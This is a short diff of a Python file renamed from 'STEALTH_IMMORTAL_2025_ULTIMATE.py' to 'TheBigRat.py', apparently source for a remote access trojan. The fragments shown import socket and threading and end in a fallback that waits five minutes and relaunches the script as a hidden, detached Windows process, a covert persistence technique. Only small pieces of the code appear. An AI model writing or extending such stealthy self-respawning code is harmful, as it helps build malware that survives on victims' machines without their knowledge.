@@ -1,4 +1,4 @@
-# STEALTH_IMMORTAL_2025_ULTIMATE.py
+# TheBigRat.py
 import os
 import socket
 import threading
@@ -684,4 +684,5 @@ if __name__ == "__main__":
     except:
         # Ultimate fallback - restart after delay
         time.sleep(300)
+
         subprocess.Popen([sys.executable, __file__], creationflags=0x8000000 | 0x8)
